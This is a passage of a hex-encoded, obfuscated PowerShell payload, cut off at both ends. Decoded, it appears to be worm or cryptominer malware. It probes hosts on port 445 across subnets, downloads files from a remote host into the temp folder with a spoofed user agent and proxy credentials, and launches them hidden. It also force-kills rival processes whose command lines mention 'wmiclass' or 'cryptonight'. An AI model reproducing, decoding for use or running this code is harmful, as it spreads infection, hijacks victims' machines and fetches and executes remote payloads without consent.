,'4e', 65 , 74 , 77 ,'6f' , 72 , '6b',20 ,'2b',20 ,31 ,29 ,'3b', 20, 24 , 69,20,'2d' ,'6c' ,74 , 20, 24 ,42 , 72 ,'6f',61 ,64 ,63,61 ,73, 74, '3b',20, 24,69 ,'2b', '2b',29 ,20,'7b' ,'d' ,'a' ,20 , 20 ,20, 20,20 ,20 , 20, 20,43,'6f' ,'6e' , 60 ,56,45, 52,54 , 54 ,60,'4f', 60 ,'2d' , 44,'6f',74,74 ,65,64 , 60 ,64,45, 63 , 69, 60,'6d', 41,'4c',69 , 70,20,24 , 69 ,'d', 'a',20 , 20 , 20, 20 , 20, 20 , '7d' , 'd' ,'a',20 ,20 , '7d','d' ,'a','7d', 'd','a','d' ,'a', 66 ,75 ,'6e' ,63 , 74 ,69 , '6f' , '6e',20, 54,65 ,73 ,74,'2d' ,50, '6f' ,72,74, 28 , 24 , 49,50 ,29 , 'd' , 'a','7b','d', 'a' ,20 ,20, 20, 20 , 74 , 72 , 79, 'd' , 'a',20 , 20,20 , 20,'7b' ,'d' ,'a' , 20 ,20 ,20, 20 ,20 , 20,20 , 20, 24,74 ,63 ,70 ,63, '6c' ,69, 65, '6e', 74, 20 , '3d' , 20 , '4e' ,65, 77,'2d' , '4f', 62,'6a' ,65,63,74 , 20 , '2d',54, 79 , 70 ,65,'4e' , 61 , '6d',65 , 20, 73,79,73 , 74,65 ,'6d' , '2e' ,'4e' ,65 ,74,'2e' ,53, '6f', 63, '6b',65 ,74 , 73, '2e' , 54,63, 70,43 , '6c',69,65 , '6e', 74 , 'd', 'a' ,20,20 ,20,20, 20 , 20,20,20 , 24 ,69 , 61, 72 , 20,'3d', 20,24 ,74 , 63 ,70,63 ,'6c' , 69 ,65,'6e' , 74 ,'2e' , 42 ,65 ,67,69 ,'6e', 43 ,'6f', '6e','6e' ,65, 63,74,28, 24 ,49,50,'2c' , 34 , 34, 35 , '2c' ,24 ,'6e', 75, '6c', '6c','2c' , 24,'6e',75 ,'6c', '6c',29 ,'d' , 'a',20, 20 , 20 ,20, 20 ,20 ,20 ,20 , 24,77 , 61 ,69 ,74, 20 ,'3d' ,20,24 ,69 , 61 , 72, '2e', 41, 73, 79, '6e', 63 , 57 , 61 , 69,74 ,48 , 61,'6e' , 64,'6c',65 ,'2e' ,57, 61, 69 ,74, '4f' ,'6e' , 65, 28 , 31 ,30 , 30 ,'2c' ,24 ,66 ,61 ,'6c', 73, 65,29,'d','a',20 , 20 ,20,20,20 ,20, 20 ,20 , 69 , 66, 28 , 21, 24, 77 , 61,69 ,74 , 29 ,'d' , 'a' , 20, 20,20, 20 ,20,20, 20 , 20 ,'7b','d','a',20 ,20 ,20, 20,20 , 20, 20,20, 20 ,20, 20 ,20, 24 , 74, 63, 70 , 63 ,'6c' , 69 , 65 , '6e' , 74, '2e' , 43,'6c' ,'6f',73 ,65,28,29 , 'd' ,'a',20 ,20,20 ,20,20 ,20,20,20 , 20 ,20,20,20,72 ,65 ,74 ,75 , 72,'6e' , 20, 24, 66 ,61,'6c' , 73 ,65, 'd', 'a', 20 ,20,20,20 ,20, 20,20 , 20,'7d','d', 'a' , 20 ,20, 20 , 20 ,20,20 ,20,20, 65 , '6c', 73,65 ,'d' ,'a' , 20 ,20,20,20,20 ,20,20 , 20 , '7b' ,'d' ,'a' ,20 , 20,20,20 , 20, 20, 20, 20,20 ,20 , 20, 20, 24 , '6e',75 , '6c', '6c' , 20 , '3d',20 , 24,74,63 ,70, 63 ,'6c' , 69, 65 ,'6e' ,74, '2e', 45 , '6e' ,64 ,43 ,'6f' , '6e' , '6e', 65 ,63 ,74 , 28,24 , 69 ,61 , 72,29 , 'd', 'a' , 20, 20 ,20,20 , 20 ,20,20 , 20,20, 20, 20 ,20 , 24, 74 ,63, 70, 63, '6c' , 69 , 65 ,'6e',74, '2e',43,'6c', '6f', 73 , 65,28 , 29 ,'d','a' ,20 ,20, 20,20 , 20,20, 20, 20,20, 20 ,20 ,20,72, 65 ,74,75 , 72 ,'6e',20, 24 ,74 , 72, 75 ,65 , 'd','a',20,20, 20 , 20 , 20 , 20 , 20, 20 , '7d', 'd', 'a' , 20, 20 ,20 , 20 ,'7d','d', 'a' , 20 ,20, 20,20 , 63,61,74, 63 ,68, 'd','a' , 20 ,20 ,20,20 , '7b', 'd', 'a' ,20, 20 , 20,20 , 20, 20,20,20, 72,65, 74 , 75, 72 , '6e', 20, 24,66, 61 ,'6c' ,73,65 , 'd' , 'a' , 20, 20 , 20 , 20,'7d','d' , 'a' , '7d' , 'd' ,'a' , 'd' ,'a',66,75, '6e',63, 74 , 69, '6f', '6e',20,47,65 ,74 ,'2d' ,49 , 70,49 ,'6e',42 ,73 , 28 ,20 ,'5b' , 53, 74 ,72 , 69, '6e' , 67,'5d',24, 69 , 70 , 62,'6f' ,64 ,79, '2c',20 , '5b' ,53 , 74, 72 , 69, '6e', 67 ,'5d', 24 , 69, 70, 62 ,'6f' ,74 , 74, '6f' , '6d' ,20, 29 , '7b' ,'d','a' ,20,20,72,65, 74, 75, 72 , '6e',20, 24 ,69,70 , 62 ,'6f' , 64 , 79, '2b' , 24 , 69 , 70,62 , '6f', 74 ,74 ,'6f', '6d' , 'd', 'a' , '7d', 'd' , 'a', 'd' , 'a' , 66 ,75, '6e', 63,74 , 69, '6f' ,'6e',20 , 47 , 65, 74 ,'2d',49 ,70,49 , '6e', 42 , 28 ,'5b', 53 ,74 ,72 ,69 ,'6e', 67,'5d',24,49, 50, 41,64, 64 ,72 ,65, 73 ,73 , 29 ,'7b' , 'd','a', 20, 20,24 ,69 , 70, 68 , 65, 61,64,'2b', '3d', 24,49 ,50,41 ,64, 64, 72, 65 ,73, 73,'2e', 53, 70,'6c',69 ,74 , 28 ,22 , '2e',22 , 29,'5b' ,30 ,'5d', '2b', 22, '2e' , 22 ,'2b' ,24 ,49, 50, 41, 64 ,64,72, 65 , 73, 73 , '2e' , 53 ,70, '6c', 69 ,74, 28, 22 , '2e',22 ,29, '5b' ,31 , '5d','2b' ,22,'2e' , 22 ,'d', 'a' ,20 , 20,46, '6f', 72 , 20, 28 ,24, 69,20 ,'3d',20 , 30, '3b' ,20,24 ,69,20 ,'2d', '6c',65, 20 ,32,35 , 34 ,'3b' , 20 , '2b' , '2b',24 , 69 , 29,'d' ,'a' , 20 , 20 , '7b','d' , 'a' , 20 ,20 ,20 ,20,24 ,69 ,70 ,62, '6f' ,64,79,'3d',24,69, 70,68 ,65, 61,64, '2b', 24 ,69 , '2b' ,22, '2e' , 22, 'd' ,'a' ,20 ,20 , 20,20 ,46 ,'6f' ,72 ,20,28 ,24,'6a', 20 ,'3d' ,20 , 31, '3b' ,20,24 , '6a',20, '2d' , '6c' ,65 ,20, 32,35 , 34 ,'3b' ,20,'2b' , '2b' , 24, '6a' , 29 , 'd' ,'a' ,20 , 20 , 20 ,20,'7b' , 'd' , 'a' , 20 ,20 ,20,20,20,20 ,47 ,65, 74 ,'2d' , 49, 70 ,49 ,'6e', 42, 73, 20 , 24, 69,70 , 62 , '6f', 64, 79 ,20, 24 , '6a','d', 'a' ,20, 20 ,20,20, '7d','d' ,'a',20,20 , '7d','d','a', '7d' ,'d' ,'a' , 'd' ,'a',66,75, '6e',63 , 74,69, '6f' ,'6e' , 20 ,44 , '6f', 77,'6e','6c' ,'6f' ,61 , 64,'5f' ,46, 69, '6c' ,65 ,'d','a', '7b','d','a', 20,20, 20,20 ,'5b' ,43,'6d' ,64 , '6c' , 65 , 74,42 ,69, '6e' , 64 ,69, '6e' , 67, 28 ,29 , '5d','d' , 'a' , 20,20 ,20 , 20 ,50 ,61 ,72, 61,'6d', 28 ,'d', 'a', 20 , 20 ,20,20 ,20,20 ,20,20 , '5b',50, 61 , 72 , 61 ,'6d',65 ,74 ,65 ,72 ,28 , 50 , '6f', 73 ,69,74 ,69, '6f' ,'6e' , 20,'3d' , 20, 30 ,'2c' , 20 , '4d',61, '6e', 64 ,61 ,74,'6f', 72 ,79, 20 ,'3d',20 , 24 , 54, 72,75, 65 , 29 ,'5d' , 'd','a' , 20 ,20, 20 , 20 , 20 , 20,20 , 20 , '5b', 53 ,74, 72, 69 , '6e' ,67 , '5d','d','a' ,20 , 20, 20, 20 ,20,20, 20 ,20 , 24, 55, 52 ,'4c', '2c' ,'d' ,'a' ,'d', 'a' , 20 , 20,20 ,20, 20, 20,20,20,'5b' ,50 ,61 , 72 , 61 ,'6d' ,65 , 74 , 65,72, 28 ,50,'6f', 73, 69,74 ,69 , '6f' , '6e' ,20 , '3d' , 20, 31 , '2c',20 , '4d', 61,'6e',64 , 61 , 74,'6f' ,72, 79 , 20, '3d' , 20 ,24 , 54,72,75 ,65 , 29 , '5d','d' , 'a',20, 20 , 20,20, 20,20,20 ,20, '5b', 53, 74 ,72,69 , '6e' , 67, '5d' , 'd' ,'a',20 , 20 , 20,20 ,20 ,20 , 20,20 ,24 , 46 , 69, '6c',65 ,'6e' , 61 ,'6d', 65 ,'d' ,'a',20,20 , 20 ,20, 29 ,'d','a' , 20 , 20,20 ,20 ,24 , 77 , 65,62,63 ,'6c', 69 ,65 , '6e' , 74 , 20 ,'3d',20, '6e',65 ,60, 57,'2d' , 60,'6f',62 , '6a',65,63, 74 ,20,53 ,79 ,73 , 74,65, '6d' , '2e' ,'4e', 65,74 , '2e',57,65 , 62 ,43 , '6c', 69 ,65 ,'6e' ,74,'d','a' , 20,20 , 20, 20 , 24 , 77,65 , 62 ,63 ,'6c', 69, 65 ,'6e', 74 , '2e',48 , 65,61 ,64,65 ,72 , 73, '2e', 41 ,64 , 64 ,28, 28, 27 , 55,27,'2b' ,27 , 73, 65,27 , '2b',27,72,'2d' , 41,67, 27,'2b',27 , 65 ,'6e' ,74, 27 , 29 ,'2c' , 28,27 ,'4d','6f','7a' , 69, 27, '2b',27,'6c', 27, '2b',27, '6c' , 61,'2f', 34, '2e',27, '2b' , 27 ,30 ,'2b' ,27, 29 ,29,'d', 'a' , 20 , 20, 20,20 ,24 , 77, 65, 62 ,63, '6c' , 69, 65 , '6e' ,74 ,'2e' ,50, 72, '6f' ,78 ,79 , 20 , '3d' ,20, '5b' , 53,79, 73,74,65 ,'6d' ,'2e' , '4e',65,74,'2e',57 , 65, 62, 52, 65 ,71,75,65,73 ,74, '5d' , '3a' ,'3a', 44 , 65 ,66 , 61, 75 , '6c', 74 ,57,65, 62, 50 , 72 ,'6f' ,78,79 ,'d','a',20 ,20 ,20,20,24, 77 , 65 , 62 ,63 , '6c' ,69, 65 ,'6e' ,74 , '2e' ,50 ,72,'6f', 78, 79,'2e',43,72 , 65, 64 , 65 , '6e',74 ,69 ,61, '6c' , 73 , 20, '3d',20 , '5b',53,79 ,73,74,65, '6d','2e','4e' , 65 , 74 ,'2e',43 , 72 , 65 ,64 ,65 , '6e' ,74, 69 , 61 , '6c' ,43,61 , 63 ,68 , 65 , '5d', '3a', '3a',44 ,65 , 66 , 61 , 75, '6c' , 74 ,'4e',65 ,74,77 ,'6f' ,72 ,'6b', 43, 72,65 ,64 , 65, '6e',74,69,61 ,'6c', 73, 'd' , 'a', 20,20,20 ,20 ,24,50, 72, '6f',78 , 79 , 41,75,74 , 68 ,20 , '3d',20 , 24, 77,65 , 62, 63, '6c' ,69, 65, '6e', 74 , '2e',50,72 ,'6f' ,78 , 79,'2e' ,49, 73 ,42 , 79 , 70,61 , 73 ,73 , 65 ,64, 28 , 24,55 ,52 , '4c' , 29,'d', 'a', 20, 20,20, 20,69 ,66, 28,24 , 50 , 72 , '6f' ,78 ,79,41 , 75, 74 ,68,29 ,'d' , 'a' , 20, 20,20 ,20,'7b' ,'d','a',20 ,20 ,20, 20, 20 ,20 ,20 ,20 , '5b' ,73 ,74 ,72, 69, '6e' , 67, '5d',24,68 ,65, 78, 66 , '6f' ,72, '6d' ,61,74,20, '3d', 20 ,24 ,77 ,65 , 62, 43,'6c', 69, 65 ,'6e' , 74 , '2e' , 44,'6f' ,77, '6e' ,'6c','6f', 61 ,64 ,53 ,74 ,72 , 69 ,'6e',67, 28 ,24 ,55,52 , '4c' ,29 , 'd' , 'a',20, 20 , 20 , 20, '7d','d', 'a' , 20,20 ,20 , 20 , 65 ,'6c' ,73, 65,'d' ,'a', 20 ,20 ,20 ,20 , '7b', 'd','a' ,20, 20,20 , 20,20 , 20, 20 ,20,24 , 77,65 , 62 , 43, '6c',69,65 , '6e' , 74,20,'3d', 20,'4e' ,60 , 65 , 57 , '2d' , 60 ,'6f', 62, '6a',65,63 ,74,20, '2d', 43,'6f','6d' ,'4f' ,62,'6a', 65 ,63 , 74, 20 , 49,'6e',74, 65 , 72,'6e' , 65 , 74 ,45, 78, 70 , '6c' , '6f' ,72,65 ,72 , '2e' , 41,70 , 70 ,'6c' ,69, 63, 61 ,74 , 69 , '6f' , '6e' ,'d','a',20 ,20,20,20,20,20 , 20,20 , 24,77 ,65, 62,43, '6c' , 69,65 , '6e' , 74,'2e' ,56 ,69 ,73 , 69,62 ,'6c' ,65 , 20 ,'3d', 20 , 24 , 66 ,61 , '6c' ,73 ,65, 'd' , 'a' ,20 , 20, 20,20 , 20 , 20 , 20, 20,24,77,65, 62,43 ,'6c' , 69 ,65,'6e', 74,'2e','4e' , 61 ,76, 69 ,67 ,61, 74 ,65, 28, 24, 55,52,'4c',29,'d' ,'a', 20,20, 20 ,20 , 20 , 20 ,20, 20 , 77 ,68 ,69 ,'6c' , 65,28, 24 ,77, 65 ,62 , 43, '6c', 69,65,'6e',74 , '2e', 52 ,65 , 61,64 ,79 ,53,74 ,61,74, 65, 20 ,'2d' , '6e' ,65, 20,34, 29, 20 , '7b' , 20 , 53 , 54, 61 ,52 ,54 ,60 , '2d', 60, 73, '6c' , 45 ,60 , 65 , 70, 20 ,'2d','4d' , 69 ,'6c' , '6c' , 69 ,73 , 65 , 63,'6f','6e', 64 ,73 , 20 , 31 ,30,30 ,20 ,'7d','d', 'a' ,20, 20 , 20 , 20 , 20,20, 20, 20 , '5b' ,73,74 ,72 ,69 ,'6e', 67, '5d', 24, 68 ,65,78, 66 ,'6f', 72, '6d' , 61 , 74 , 20 , '3d',20 ,24 ,77,65 , 62 , 43, '6c', 69 , 65 , '6e', 74 ,'2e', 44, '6f' , 63,75,'6d',65 , '6e', 74 , '2e' ,42 , '6f',64 , 79,'2e',69,'6e' ,'6e',65 ,72, 54 , 65 ,78, 74 , 'd' , 'a' ,20 ,20 ,20,20,20 , 20, 20,20, 24 ,77 ,65, 62 , 43 ,'6c', 69 ,65, '6e' ,74 , '2e' ,51,75 ,69 , 74,28 ,29 ,'d', 'a',20, 20, 20, 20, '7d','d', 'a' , 20 , 20, 20 , 20, '5b' ,42 ,79, 74 , 65 , '5b' ,'5d' ,'5d', 20, 24 ,74 ,65 ,'6d' ,70 , 20,'3d', 20, 24 , 68 ,65 ,78 ,66, '6f' ,72 , '6d' , 61 ,74,20,'2d', 73 ,70 ,'6c' ,69,74,20, 27 ,20, 27, 'd','a',20,20,20, 20 ,'5b',53, 79 , 73, 74,65 , '6d' , '2e',49 ,'4f' , '2e',46 ,69 ,'6c' ,65, '5d', '3a','3a',57 ,72 , 69 , 74, 65, 41,'6c' ,'6c', 42 ,79 , 74,65 , 73,28, 22, 24 , 65 , '6e' ,76,'3a' ,74, 65 ,'6d' ,70 ,'5c' ,24,46, 69,'6c' ,65 ,'6e' , 61 ,'6d',65 ,22, '2c', 20 ,24 , 74,65,'6d',70,29 , 'd' , 'a' ,'7d' , 'd' ,'a','d','a' , 66, 75, '6e' ,63 , 74 ,69,'6f','6e' ,20 , 52 , 75 , '6e', 44 , 44 , '4f' , 53 , 28 ,'5b', 53 ,74, 72,69,'6e' ,67 , '5d', 24 , 46 ,69 ,'6c', 65, '4e' ,61, '6d' ,65 , 29 , 'd' ,'a','7b' ,'d', 'a' ,20, 20 , 20 , 20 ,69, 66 , 20,28, 28 , 74, 65 , 53 , 74,'2d',60 , 50 ,61,60, 54, 48, 20,28 ,24, 65 , '6e', 76 ,'3a' ,74, 65 ,'6d' , 70,'2b' , 22,'5c', 24 , 46,69, '6c',65, '4e' ,61 ,'6d', 65 , 22 ,29 , 29,29 ,'7b' , 'd' , 'a',20, 20 ,20 , 20 , 20 ,20 ,20 ,20 , 24,70 , 72 , '6f' ,63,'3d',24 ,46,61 , '6c' , 73, 65 , 'd','a' ,20,20, 20, 20 , 20 , 20 , 20 ,20 ,'5b' , 61, 72 ,72 ,61 , 79,'5d' , 24 , 70 , '3d' ,67 , 45 ,54, 60 , '2d' ,77 ,'6d' , 69 ,'4f', 42 , 60,'4a' , 45 ,60 , 63, 54 ,20 ,'2d', 43,'6c',61, 73, 73,20,57 , 69, '6e' , 33 ,32,'5f', 50 ,72 ,'6f' , 63,65,73,73,20, '7c', 20, 53, 65,'4c' ,45,60, 63,54,20 ,'4e' , 61, '6d', 65 , 'd','a' , 20,20,20, 20, 20 , 20 ,20,20 ,66,'6f' , 72 ,65 , 61,63 ,68 , 28, 24 ,70,72 , '6f' , 63, 65 ,73 , 73,20 , 69 , '6e', 20, 24, 70 , 29 , '7b','d' , 'a',20, 20,20 ,20 ,20 ,20 ,20 ,20, 20,20 ,20 , 20 ,24,'6e' , 61 ,'6d', 65, 20, '3d', 20 ,28 ,'5b',73 ,74,72, 69,'6e' ,67,'5d' , 28 ,24, 70,72 ,'6f', 63 ,65,73, 73,'2e' ,'4e', 61,'6d',65,29, 29 ,'2e' ,54,'6f', '4c', '6f' ,77, 65,72,28 , 29, 'd' ,'a' ,20, 20 , 20 ,20, 20, 20 , 20,20 ,20, 20 , 20,20,69,66,28 , 28 , 24, '6e',61 , '6d',65 , 20 , '2d' , '6e' , 65 , 20,24, '6e' ,75 , '6c' ,'6c' , 29 ,20 , '2d' ,61,'6e', 64, 20 ,28,24 , '6e' ,61 , '6d',65, 20,'2d' ,'6e',65 ,20 , 22 , 22, 29, 29 ,'7b','d', 'a',20,20 , 20 ,20 ,20,20 ,20 ,20,20 ,20 ,20,20 ,20 , 20,20, 20 , 69 , 66,28,24 , '6e', 61 , '6d',65, '2e' ,63 , '6f' ,'6e', 74 ,61,69 , '6e', 73, 28,28,24, 46 ,69, '6c' ,65,'4e' , 61 , '6d', 65 ,29 , 29 , 20, '2d',65, 71,20 ,24 ,74 , 72 , 75 ,65 , 29,'7b' ,'d', 'a' , 20 ,20, 20 ,20 ,20 , 20,20, 20 ,20 , 20 , 20 , 20,20 ,20, 20,20 , 20, 20 ,20 , 20,45, 63 ,60,48, '6f',20, 28 , 27 , 72 , 27 , '2b',27 ,75 , '6e' , 27 ,'2b',27 , 69,'6e',67, 27,29, 'd', 'a', 20,20, 20,20 , 20 , 20 , 20,20 ,20 ,20 ,20 , 20 ,20,20,20,20 ,20,20, 20 , 20 , 24 , 70,72 , '6f',63, '3d', 24, 54, 72,75, 65, 'd', 'a', 20, 20,20 , 20,20 , 20, 20, 20,20,20, 20, 20 ,20 , 20,20 ,20 ,'7d','d','a' , 20 ,20 , 20,20 , 20 ,20 ,20, 20, 20,20,20, 20, '7d','d' ,'a', 20,20 , 20, 20, 20,20 , 20 ,20, '7d' , 'd', 'a' , 20 , 20, 20,20 , 20 ,20,20 , 20,69 ,66 , 20 , 28 , 24, 70 ,72 ,'6f',63, 20,'2d' ,'6e', 65 , 20 , 24 , 74,72 ,75 ,65 ,29 , 'd' ,'a',20, 20 , 20, 20,20,20, 20 , 20 ,'7b' , 'd' ,'a' , 20 , 20 , 20, 20 , 20, 20 ,20 , 20, 20 , 20 , 53 , 74 , 61,60, 52 , 54 ,60 , '2d', 50, 52, '4f', 43 ,65 ,53 , 53,20 , '2d' ,'4e' , '6f', '4e', 65, 77,57 ,69 ,'6e' , 64 , '6f' , 77, 20, 22 , 24,65 , '6e', 76 , '3a', 74, 65 , '6d' ,70, '5c',24 , 46 , 69 ,'6c',65, '4e' ,61,'6d',65 , 22 ,'d' ,'a', 20,20 ,20,20, 20 , 20 ,20, 20, '7d', 'd' , 'a',20, 20, 20,20, '7d' ,65 ,'6c', 73 ,65,'7b', 'd','a' , 20, 20,20 ,20 , 20, 20,44 ,'6f' , 57,'6e' ,60 ,'6c' ,'6f', 61,60, 44, 60,'5f' ,46 , 60 , 69, '6c' ,65, 20, 22 ,68,74 , 74 ,70 ,'3a', '2f' , '2f',24, '6e',69,63,'2f', '6c' ,'6f',67, '6f', 73 ,'2e' , 70 , '6e', 67,22 ,20 , 28 ,27,'6a' , 61,76 ,27,'2b',27 ,61 ,'2d','6c', '6f', 67 , '2d' ,39, 35 , 32 , 27,'2b' , 27 ,37, '2e' ,27, '2b', 27, '6c' ,'6f' , 67 , 27 ,29, 'd' , 'a' ,20 ,20,20, 20, 20 , 20, 53,'6c', 60,45, 45 ,70,20 , '2d', 53 ,65 , 63 ,'6f' , '6e', 64 ,73 ,20 ,35 ,'d' , 'a' ,20,20, 20,20,20 ,20, 69,66, 20 , 28,21 ,28, 74, 60 , 65,73 ,54 , '2d' , 70, 61 ,60 ,54 ,68 , 20 , 28 ,24, 65 , '6e', 76,'3a' , 74 , 65,'6d', 70 , '2b',28 , 28, 27,'7b',30,27, '2b', 27, '7d' , 27,'2b', 27,'6a' , 61, 76,61 ,27, '2b', 27,'2d' ,'6c' ,'6f',67 , 27 ,'2b' ,27 ,'2d', 27, '2b',27,39,35 , 27, '2b' ,27 , 32, 37 , '2e' , '6c','6f',67,27, 29,20, '2d',46,20 ,20,'5b',63,48, 41 ,52 ,'5d' , 39 ,32 , 29 ,29 ,29 , 29 ,'d' , 'a' ,20 ,20,20, 20,20 , 20, '7b' , 72 , 65, 74,75, 72, '6e',20 ,24, 46, 61 ,'6c' , 73 , 65,'7d' ,'d', 'a' ,20 , 20,20 , 20,20 ,20 ,44, '6f', 57,'4e',60, '6c',60 , '4f' ,61 , 60, 44 , '5f', 46, 69 ,'4c' ,45 ,20,22, 68 , 74 , 74 , 70 ,'3a','2f', '2f' , 24, '6e', 69 ,63, '2f', 63, '6f' , 68 , 65 , 72,'6e' ,65 ,63 , 65,'2e' , 74 ,78, 74, 22 , 20 , 22,24 , 46, 69 ,'6c' ,65 , '4e' , 61, '6d' , 65 , 22 ,'d' ,'a' ,20 ,20, 20, 20, 20, 20, 73,54 ,41 ,52, 54, '2d',70 , 72 , '6f' , 60 , 43,60, 45, 73,73 , 20 , '2d' ,'4e','6f','4e',65, 77 , 57 , 69, '6e' ,64,'6f' , 77 , 20, 22, 24, 65 ,'6e', 76 ,'3a' , 74 , 65 , '6d' ,70,'5c',24, 46 ,69 , '6c',65 ,'4e' , 61,'6d', 65,22 ,'d','a' ,20, 20 ,20 , 20 ,'7d' , 'd','a' , '7d' ,'d', 'a', 'd', 'a' , 66 ,75 , '6e' ,63,74, 69, '6f','6e' ,20 , '4b' , 69 ,'6c', '6c' ,42 ,'6f', 74 ,20 ,28 , '5b',53 ,74, 72 , 69 ,'6e', 67,'5d', 24,57 ,'6d',69, 43, '6c' , 61 , 73,73 ,'4e', 61 ,'6d', 65 , 29 ,'7b', 'd', 'a',20,20, 20,20 , '5b' ,61,72, 72 , 61, 79 ,'5d' , 24 , 70 ,'3d', 47 ,65 ,74,'2d',77 ,'6d' ,69, '6f',62,'6a' ,65, 63,74 ,20, '2d' , 43, '6c' ,61 ,73,73 ,20,57 , 69 , '6e',33, 32, '5f' ,50 , 72 ,'6f' , 63, 65, 73,73 ,20 ,'7c',20, 73 , 65 , '6c' ,65 , 63 ,74, 20 , '4e' ,61 ,'6d',65,'2c' , 50, 72 , '6f' , 63 , 65 , 73, 73,49 , 64, '2c' ,43 , '6f' , '6d', '6d', 61 , '6e' , 64 , '4c',69,'6e',65 , '2c' , 50 , 61, 74, 68, 'd', 'a' , 20 , 20,20 ,20 ,69, 66, 28 , 28 ,24 , 70 ,20 , '2d','6e' , 65 , 20 , 24,'6e' , 75 , '6c', '6c' , 29 ,20 ,'2d' ,61 ,'6e',64, 20 ,28,24 ,70 , 20,'2d' , '6e' ,65 ,20,22 ,22 ,29 ,29, '7b' , 'd' , 'a',20 ,20 , 20, 20 , 20 , 20,20,20 , 66, '6f' , 72, 65 ,61 ,63, 68 ,28, 24,70, 72, '6f' , 63, 65, 73, 73,20 , 69, '6e' ,20,24,70 ,29 , '7b', 'd','a' ,20, 20 , 20,20,20,20,20 , 20,20,20,20 ,20 , 24 ,69, 64, 20 , '3d' ,20 ,24, 70, 72 , '6f' , 63 , 65,73 ,73,'2e' , 50 ,72 ,'6f' ,63,65 , 73,73 , 49 ,64 ,'d','a',20 , 20, 20 ,20,20, 20 ,20, 20 , 20 ,20, 20 , 20, 24, 63 ,'6f' , '6d','6d', 61 , '6e', 64 , 20 ,'3d',20 , 28 , '5b' ,73 , 74 ,72,69 , '6e', 67,'5d' ,28 ,24,70 ,72 , '6f',63 ,65,73 , 73 , '2e',43 , '6f' ,'6d' , '6d' ,61, '6e' ,64, '4c' ,69, '6e',65,29,29,'2e', 54, '6f', '4c' , '6f' , 77,65,72 , 28, 29 , 'd', 'a' ,20 ,20, 20 , 20,20 ,20 , 20,20 ,20 , 20 ,20,20 ,24 , 70, 61,74 , 68, 20, '3d', 20 , 28 , '5b',73, 74 , 72 , 69,'6e' ,67,'5d' , 28,24,70 ,72 , '6f',63, 65, 73,73, '2e' ,50 , 61 ,74 , 68 ,29 ,29,'2e', 54 ,'6f', '4c', '6f' ,77, 65,72,28 , 29 ,'d' ,'a' , 20 , 20 , 20, 20 ,20,20, 20,20 , 20 ,20 , 20 ,20 ,23 , 20, 63, '6d' , 64 , '6c' , 69 , '6e',65 , 'd' , 'a' , 20 ,20 ,20,20 ,20 ,20 , 20, 20,20, 20 ,20,20 ,69 , 66 ,28, 28,24 ,63,'6f','6d','6d', 61,'6e' ,64 , 20, '2d', '6e' ,65,20, 24 ,'6e' , 75, '6c' ,'6c', 29 ,20 , '2d' , 61 ,'6e', 64 ,20 , 28 , 24, 63 , '6f' , '6d','6d',61 ,'6e' ,64 , 20, '2d' , '6e', 65 , 20, 22 ,22,29 , 29, '7b' ,'d','a', 20 , 20 , 20,20 ,20, 20, 20 , 20,20 , 20,20 , 20, 20 , 20 ,20 ,20, 69 ,66, 28 , 24, 63, '6f' ,'6d', '6d' ,61, '6e' , 64, '2e', 63 , '6f' , '6e',74, 61 , 69 ,'6e' ,73, 28, 28, 27 , 77 ,'6d',69,63 , '6c',61, 73, 73 ,27, 29 ,29 , 20 , '2d', 65 , 71 ,20 ,24, 74 , 72, 75, 65 ,29,'7b' ,'d' ,'a' , 20,20 , 20,20, 20, 20 , 20,20 ,20 ,20, 20 , 20, 20, 20, 20 , 20,20 , 20, 20,20,69 , 66 , 28 , 24,63, '6f','6d','6d' , 61 , '6e', 64 , '2e' , 63,'6f','6e',74 , 61 ,69,'6e', 73 ,28, 24, 57 ,'6d', 69 ,43, '6c', 61,73,73,'4e' , 61 ,'6d', 65 , '2e',54, '6f', '4c' , '6f' , 77,65 ,72, 28 ,29,29 , 20,'2d','6e',65, 20 , 24,74,72,75, 65 ,29 , '7b','d' ,'a' ,20 , 20 , 20 ,20, 20 ,20 ,20 , 20, 20 ,20,20,20,20, 20 , 20 ,20, 20 ,20, 20 ,20,20 , 20 , 20,20, 73,74,'6f',70 ,'2d', 70, 72, '6f' , 63 ,65,73 ,73 ,20 ,'2d', 49 , 64 , 20, 24 ,69 , 64, 20 ,'2d', 46,'6f', 72, 63, 65 ,'d', 'a' ,20,20 , 20 ,20, 20 ,20, 20 ,20 , 20 ,20,20 , 20 ,20 ,20, 20,20,20 , 20 ,20 , 20 ,'7d' ,'d' , 'a',20 , 20, 20 , 20 ,20,20 ,20, 20 ,20 , 20 ,20 , 20, 20 , 20, 20, 20,'7d' ,'d' ,'a',20 ,20, 20, 20,20 , 20, 20,20,20 ,20,20,20, 20, 20, 20 ,20 ,69, 66,28 , 24,63 ,'6f' , '6d', '6d' , 61 ,'6e' ,64 , '2e' ,63 ,'6f' , '6e', 74, 61 ,69 , '6e' ,73 , 28 , 28 , 27,63 ,72 , 79 , 70, 74,'6f' , '6e' ,69,67,68 , 74,27,29,29 , 20, '2d', 65,71,20, 24,74 ,72 ,75,65, 29 , '7b','d' ,'a', 20,20 ,20 , 20,20 , 20 , 20, 20, 20 , 20 ,20,20 , 20 , 20 , 20, 20 , 20 , 20 , 20 , 20, 24 ,50 ,61 ,72 ,65 , '6e' , 74 ,50 ,72 , '6f' , 63 ,65, 73 ,73 , 49 ,64 ,20, '3d' , 20, 28,67,65 ,74,'2d',77, '6d' , 69,'6f', 62 ,'6a' , 65 ,63 , 74,20,'2d' ,43,'6c',61, 73,73 ,20 , 57 ,69 ,'6e', 33,32, '5f' ,50 , 72 , '6f' , 63 , 65 , 73 , 73 , 20, '2d', 46, 69 ,'6c', 74,65 ,72, 20 ,22 ,50 , 72, '6f' ,63 ,65, 73, 73 ,49 ,64 ,'3d', 24, 69 ,64 , 22 , 29,'2e' , 50 ,61 ,72, 65 , '6e',74 , 50, 72,'6f',63,65 , 73 ,73 ,49 , 64 ,'d' , 'a',20,20, 20, 20 , 20,20,20,20,20 , 20, 20, 20 , 20 , 20 ,20 ,20 , 20, 20 ,20 ,20 ,69 ,66, 28,28, 24,69, 64, 20,'2d' ,'6e',65, 20, 24 ,'6e' , 75,'6c' , '6c' ,29 ,20 , '2d', 61,'6e' , 64 ,20, 28 , 24 ,69 , 64,20 , '2d' , '6e', 65,20,22,22 , 29, 29 , '7b' , 'd' , 'a' ,20,20 ,20,20 , 20, 20,20 ,20 ,20 ,20 ,20, 20 ,20 , 20,20, 20, 20, 20, 20 ,20 ,20, 20, 20 , 20,73 ,74 ,'6f' ,70, '2d' ,70 , 72, '6f',63 ,65 , 73 , 73, 20 ,'2d' , 49 ,64 ,20 ,24 